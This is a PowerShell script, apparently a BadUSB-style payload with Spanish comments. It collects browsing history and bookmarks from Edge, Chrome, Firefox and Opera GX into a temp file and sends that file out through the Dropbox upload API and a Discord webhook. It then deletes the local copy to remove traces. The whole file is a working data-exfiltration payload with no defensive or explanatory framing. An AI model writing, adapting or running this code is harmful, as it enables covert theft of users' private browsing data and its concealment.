function Get-BrowserData {

    [CmdletBinding()]
    param (	
        [Parameter(Position=1, Mandatory=$True)]
        [string]$Browser,    
        [Parameter(Position=2, Mandatory=$True)]
        [string]$DataType 
    ) 

    $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'

    if     ($Browser -eq 'chrome'  -and $DataType -eq 'history')    {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"}
    elseif ($Browser -eq 'chrome'  -and $DataType -eq 'bookmarks')  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"}
    elseif ($Browser -eq 'edge'    -and $DataType -eq 'history')    {$Path = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History"}
    elseif ($Browser -eq 'edge'    -and $DataType -eq 'bookmarks')  {$Path = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks"}
    elseif ($Browser -eq 'firefox' -and $DataType -eq 'history')    {$Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"}
    elseif ($Browser -eq 'opera'   -and $DataType -eq 'history')    {$Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"}
    elseif ($Browser -eq 'opera'   -and $DataType -eq 'bookmarks')  {$Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"}

    $Value = Get-Content -Path $Path | Select-String -AllMatches $regex | % {($_.Matches).Value} | Sort -Unique
    $Value | ForEach-Object {
        $Key = $_
        if ($Key -match $Search){
            New-Object -TypeName PSObject -Property @{
                User = $env:UserName
                Browser = $Browser
                DataType = $DataType
                Data = $_
            }
        }
    } 
}

Get-BrowserData -Browser "edge" -DataType "history" | Out-File -FilePath "$env:TMP\--BrowserData.txt" -Append

Get-BrowserData -Browser "edge" -DataType "bookmarks" | Out-File -FilePath "$env:TMP\--BrowserData.txt" -Append

Get-BrowserData -Browser "chrome" -DataType "history" | Out-File -FilePath "$env:TMP\--BrowserData.txt" -Append

Get-BrowserData -Browser "chrome" -DataType "bookmarks" | Out-File -FilePath "$env:TMP\--BrowserData.txt" -Append

Get-BrowserData -Browser "firefox" -DataType "history" | Out-File -FilePath "$env:TMP\--BrowserData.txt" -Append

Get-BrowserData -Browser "opera" -DataType "history" | Out-File -FilePath "$env:TMP\--BrowserData.txt" -Append

Get-BrowserData -Browser "opera" -DataType "bookmarks" | Out-File -FilePath "$env:TMP\--BrowserData.txt" -Append

# Subir archivo de salida a Dropbox

function DropBox-Upload {

    [CmdletBinding()]
    param (
        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
        [Alias("f")]
        [string]$SourceFilePath
    ) 
    $outputFile = Split-Path $SourceFilePath -Leaf
    $TargetFilePath = "/$outputFile"
    $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
    $authorization = "Bearer " + $db
    $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
    $headers.Add("Authorization", $authorization)
    $headers.Add("Dropbox-API-Arg", $arg)
    $headers.Add("Content-Type", 'application/octet-stream')
    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
}

if (-not ([string]::IsNullOrEmpty($db))) {
    DropBox-Upload -SourceFilePath "$env:TMP\--BrowserData.txt"
}

# Subir archivo de salida a Discord

function Upload-Discord {

    [CmdletBinding()]
    param (
        [Parameter(Position=0, Mandatory=$False)]
        [string]$file,
        [Parameter(Position=1, Mandatory=$False)]
        [string]$text 
    )

    $hookurl = "$dc"

    $Body = @{
        'username' = $env:username
        'content' = $text
    }

    if (-not ([string]::IsNullOrEmpty($text))){
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)
    }

    if (-not ([string]::IsNullOrEmpty($file))) {
        curl.exe -F "file1=@$file" $hookurl
    }
}

if (-not ([string]::IsNullOrEmpty($dc))) {
    Upload-Discord -file "$env:TMP\--BrowserData.txt"
}

# Eliminar el archivo temporal

Remove-Item "$env:TMP\--BrowserData.txt"
